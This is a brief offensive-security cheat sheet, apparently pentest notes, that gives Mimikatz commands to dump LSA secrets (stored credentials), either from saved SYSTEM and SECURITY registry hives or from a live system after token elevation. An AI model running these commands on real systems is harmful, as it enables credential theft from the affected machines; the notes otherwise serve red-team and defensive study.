# LSA secrets extraction

## Mimikatz

Extract LSA secrets from registry hives:

```csharp
lsadump::secrets /system:c:\temp\system /security:c:\temp\security
```

Or on a live system locally:

```csharp
token::elevate
lsadump::secrets
```

